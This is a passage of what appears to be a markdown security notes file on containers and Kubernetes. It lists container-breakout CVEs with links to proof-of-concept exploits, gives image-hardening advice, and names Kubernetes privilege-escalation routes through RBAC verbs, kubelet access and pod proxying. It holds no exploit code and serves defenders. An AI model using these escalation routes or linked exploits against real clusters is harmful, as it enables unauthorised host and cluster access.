| [CVE-2019-13139](https://nvd.nist.gov/vuln/detail/CVE-2019-13139) | 8.4 | Manipulation of the build path for the "docker build" command could allow for command execution | < 18.09.4 | 18.09.4 |  |
| [CVE-2018-15664](https://nvd.nist.gov/vuln/detail/CVE-2018-15664) | 7.5 | docker cp race condition   |  < 18.06.1-ce-rc2 | 18.06.1-ce-rc2  | [Capsule8 blog post](https://capsule8.com/blog/race-conditions-cloudy-with-a-chance-of-r-w-access/) |
| [CVE-2017-14992](https://nvd.nist.gov/vuln/detail/CVE-2017-14992) | 6.5 | Dos via gzip bomb   | < 17.09.1 | 17.09.1 |  |


|  |  |  |  |  |  |


### 5.Container Breakout Vulnerabilities

A list of CVEs in the various parts of the container stack that could allow for unauthorised access to host resources (e.g. filesystem, network stack) from a container.

With Linux issues it can be a bit tricky to say if they're container escapes or not so generally looking at ones where container escape has been demonstrated.


#### Linux CVEs

- [CVE-2022-0847](https://dirtypipe.cm4all.com/) - a.k.a DirtyPipe. Vulnerability allows for overwrite of files that should be read-only. Basic container information [here](https://blog.aquasec.com/cve-2022-0847-dirty-pipe-linux-vulnerability), full container breakout PoC writeup [here](https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/) and code [here](https://github.com/DataDog/dirtypipe-container-breakout-poc)
- [CVE-2022-0492](https://access.redhat.com/security/cve/cve-2022-0492). Vulnerability in cgroup handling can allow for container breakout depending on isolation layers in place. Container breakout details [here](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [CVE-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html) - Local privilege escalation, needs CAP_SYS_ADMIN either at the host level or in a user namespace
- [CVE-2021-31440](https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier) - eBPF incorrect bounds calculation allows for privesc.
- [CVE-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html) - Linux LPE used to break out of Kubernetes pod by the researcher
- [CVE-2017-1000112](https://capsule8.com/blog/practical-container-escape-exercise/) - memory corruption in UFO packets.
- [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-5195) - (a.k.a 'dirty CoW') - race condition leading to incorrect handling of Copy on Write.
- [CVE-2017-5123](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5123) - vulnerability in the WaitID syscall.

#### runc CVEs
- [CVE-2021-30465](http://blog.champtar.fr/runc-symlink-CVE-2021-30465/) - race condition when mounting volumes into a container allows for host access.
- [CVE-2019-5736](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html) - overwrite runc binary on the host system at container start.
- [CVE-2016-9962](https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2) - access to a host file descriptor allows for breakout.

#### Containerd CVEs
- [CVE-2022-23648](https://bugs.chromium.org/p/project-zero/issues/detail?id=2244) - Vuln in volume mounting allows for arbitrary file read from the underlying host, leading to likely indirect container breakout. PoC exploit [here](https://github.com/raesene/CVE-2022-23648-POC)

#### CRI-O CVEs
- [CVE-2022-0811](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) - Vulnerability in setting sysctls in k8s/OpenShift manifests allows for container breakout. Linked post has full PoC details.

#### Docker CVEs
- [CVE-2021-21284](https://github.com/moby/moby/security/advisories/GHSA-7452-xqpj-6rpc) - When using user namespaces, a user with some access to the host filesystem can modify files which they should not have access to.

#### Kubernetes CVES
- [CVE-2021-25741](https://groups.google.com/g/kubernetes-security-announce/c/nyfdhK24H7s) - race condition in when using hostPath volumes allows for privileged access to host filesystem
- [CVE-2021-25737](https://groups.google.com/g/kubernetes-security-announce/c/xAiN3924thY) - unauthorized access to host network stack by using endpoint slices
- [CVE-2017-1002101](https://github.com/kubernetes/kubernetes/issues/60813) - subpath volume mount handling allows arbitrary file access in host filesystem
- [CVE-2017-1002102](https://github.com/kubernetes/kubernetes/issues/60814) - Arbitrary deletion of files on the host possible when using some Kubernetes volume types


#### Reference Links

- [Linux Kernel Exploitation](https://github.com/xairy/linux-kernel-exploitation/blob/master/README.md) - Extensive maintained list of links relating to Linux Kernel Exploitation

### 5.Defenders - Container Image Hardening

Improving the security of container images, generally focuses on removing unecessary software to reduce the attack surface. In addition to this, avoiding risky software installation practices is a good idea if you're building production container images and for all images, avoiding using the root user will be important.

#### Attack surface reduction

There's a number of options for reducing your container image attack surface.

##### "Scratch" base image

This is essentially an almost empty base image with no package management or other operating system libraries. Whether this is a practical option for a given image largely depends on how the application you want to run in the container works. For a scratch image to be usuable, your application needs to be able to run without any supporting operating system libraries.

Things like statically compiled Golang or ASP.Net Core applications can often work in a scratch containers, where others which use a lot of supporting libraries, are unlikely to have an easy time using this approach.

##### Google Distroless

### 6.Kubernetes Security Architecture Considerations

This is an (at the moment) random list of things to think about when architecting Kubernetes based systems. They may not all still be current and if you know one's not right, PRs always welcome :)


#### CVEs

- There are a number of CVEs in Kubernetes which have no patch and require manual mitigation from cluster operators.
  - [CVE-2020-8561](https://groups.google.com/g/kubernetes-security-announce/c/RV2IhwcrQsY)
  - [CVE-2021-25740](https://groups.google.com/g/kubernetes-security-announce/c/WYE9ptrhSLE)
  - [CVE-2020-8562](https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY)
  - [CVE-2020-8554](https://groups.google.com/g/kubernetes-security-announce/c/iZWsF9nbKE8)

#### Authentication

- None of the built-in authentication mechanisms shipped with base k8s are suitable for use by users.
  - Token authentication requires clear text tokens on disk and an API server restart to change.
  - Client certificate authentication does not support revocation (Github issue [here](https://github.com/kubernetes/kubernetes/issues/18982))
- Kubernetes does not have a user database, it relies on identity information passed from any approved authentication mechanism.
  - This means that if you have multiple valid authentication mechanisms, there is a risk of duplicate user identities. N.B. Kubernetes audit logging does record the identity of the user, but not the authentication source.


#### RBAC

- There are various RBAC rights that can allow for Privilege escalation
  - GET or LIST on secrets at a cluster level (or possibly at a namespace level) will allow for privesc via service account secrets. N.B. LIST on its own will do this.
  - Access to ESCALATE, IMPERSONATE or BIND as RBAC verbs can allow privilege escalation.
- The `system:masters` group is **hard-coded** into the API server and provides cluster-admin rights to the cluster.
  - Access by a user using this group bypasses authorization webhooks (i.e. the request is never sent to the webhook)
- Access to the node/proxy resource allows for privilege escalation via the kubelet API. Users with this right can either go via the Kubernetes API server to access the kubelet API, *or* go directly to the kubelet API. The kubelet API does not have audit logs and its use bypasses admission control.

#### Networking

- Pods allowed to use host networking bypass Kubernetes Network Policies.
- Services allows to used nodePorts can't be limited by Kubernetes Network Policies.
- The pod proxy feature can be used to access arbitrary IP addresses **via** the Kubernetes API server (i.e. connections come from the API server address), which may bypass network restrictions (more details [here](https://kinvolk.io/blog/2019/02/abusing-kubernetes-api-server-proxying/))

#### Pod Security Standards

- Without restriction on privileged containers, pods can be used to escalate privileges to node access
- Some capabilities will similarly allow for node access
  - CAP_SYS_ADMIN

#### Distributions

- Many Kubernetes distributions provide a first user which uses a client certificate (so no revocation) bound to the system:masters group, so guaranteed cluster-admin. 
- Some distributions place sensitive information such as the API server certificate authority private key in a configmap (e.g. [RKE1](https://github.com/rancher/rke/issues/1024))

#### DNS
 - At the moment it is possible to use DNS to enumerate all pods and services in a cluster, which can make leak information especially in multi-tenant clusters. (CoreDNS Issue [here](https://github.com/coredns/coredns/issues/4984)) (script to demonstrate [here](https://github.com/adavarski/HomeLab-Proxmox-k8s-DevSecOps-playground/tree/main/DevSecOps-K8S/alpine-containertools/scripts/k8s-dns-enum.rb)

#### Auditing
- Kubernetes auditing is not enabled by default.
- Allowing direct access to the kubelet API effectively bypasses auditing, so care should be taken in allowing this.
- Whilst audit logging provides the user who made the request it doesn't log the authentication mechanism used. As such if there are multiple configured authentication mechanisms (e.g. certificate authentication and OIDC) there is a risk that an attacker can create a user account which would appear to be that of another legitimate user.

Ref: [CTR Kubernetes Hardening Guide](https://github.com/adavarski/HomeLab-Proxmox-k8s-DevSecOps-playground/blob/main/DevSecOps-K8S/CTR_KUBERNETES%20HARDENING%20GUIDANCE.PDF)
